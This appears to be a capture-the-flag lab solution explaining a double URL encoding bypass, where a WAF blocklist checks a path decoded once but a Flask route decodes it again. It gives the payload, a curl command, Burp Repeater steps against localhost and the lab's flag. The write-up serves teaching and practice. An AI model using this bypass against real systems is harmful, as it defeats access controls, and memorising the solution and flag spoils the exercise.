# SOLUTION — Lab 01 · Path Double URL Encoding

## Vulnerability

The application decodes the URL path **twice**:
- Once by the proxy/WAF layer (standard URL decoding)
- Once again inside the Flask route handler via `unquote()`

The blocklist only checks the path after the **first** decode.  
By encoding each character of `admin` a second time, the blocklist sees  
something that doesn't match — but the app ultimately resolves to `admin`.

## Encoding table

| Char | URL encode | Double encode |
|------|-----------|---------------|
| `a`  | `%61`     | `%2561`       |
| `d`  | `%64`     | `%2564`       |
| `m`  | `%6d`     | `%256d`       |
| `i`  | `%69`     | `%2569`       |
| `n`  | `%6e`     | `%256e`       |

## Payload

```
GET /panel/%2561%2564%256d%2569%256e HTTP/1.1
Host: localhost:5001
```

### With curl

```bash
curl --path-as-is http://localhost:5001/panel/%2561%2564%256d%2569%256e
```

### With Burp Repeater

1. Send a normal request to `GET /` and forward to Repeater
2. Change the path to `/panel/%2561%2564%256d%2569%256e`
3. Disable **Update Content-Length** (not needed here)
4. Send → 200 with the flag

## Trace

```
Client sends:   /panel/%2561%2564%256d%2569%256e
WAF decodes:    /panel/%61%64%6d%69%6e          ← not "admin" → allowed
App decodes:    /panel/admin                    ← matches handler → flag
```

## Flag

```
HackUTT{d0ubl3_enc0d1ng_byp4ss_ftw}
```
